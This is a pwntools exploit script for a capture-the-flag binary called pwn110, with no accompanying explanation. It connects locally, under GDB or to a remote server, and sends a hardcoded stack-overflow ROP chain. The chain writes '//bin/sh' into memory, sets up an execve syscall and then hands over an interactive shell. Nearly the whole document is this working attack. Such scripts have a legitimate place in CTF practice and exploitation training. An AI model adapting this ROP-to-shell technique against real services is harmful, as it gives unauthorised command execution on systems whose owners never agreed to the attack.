from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pwn110.pwn110'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'


io = start()


payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd8\x19A\x00\x00\x00\x00\x00//bin/sh{ @\x00\x00\x00\x00\x00\xe0\x00L\x00\x00\x00\x00\x00UGH\x00\x00\x00\x00\x00\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xd8\x19A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00{ @\x00\x00\x00\x00\x00\xe8\x00L\x00\x00\x00\x00\x00UGH\x00\x00\x00\x00\x00\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\x1a\x19@\x00\x00\x00\x00\x00\xe0\x00L\x00\x00\x00\x00\x00\xde\xf4@\x00\x00\x00\x00\x00\xe8\x00L\x00\x00\x00\x00\x00\x1f\x18@\x00\x00\x00\x00\x00\xe8\x00L\x00\x00\x00\x00\x00\xd7\x97D\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\xd4sA\x00\x00\x00\x00\x00"

# Save the payload to file
write('payload10', payload)

# Send the payload
io.sendlineafter("libc üòè\n", payload)

# Receive the flag
io.interactive()